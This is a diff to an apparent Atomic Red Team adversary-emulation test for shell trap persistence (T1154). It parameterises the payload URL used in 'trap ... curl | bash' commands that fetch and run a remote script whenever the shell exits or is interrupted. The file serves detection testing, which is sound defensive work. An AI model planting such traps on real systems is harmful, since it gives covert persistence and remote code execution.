@@ -15,9 +15,14 @@ atomic_tests:
     - ubuntu
     - linux
 
+  input_arguments:
+    payload_sh_file: URL of the payload .BAT file
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh
+
   executor:
     name: sh
     command: |
-      trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+      trap 'nohup curl -sS #{payload_sh_file} | bash' EXIT
       exit
-      trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+      trap 'nohup curl -sS #{payload_sh_file} | bash' INT
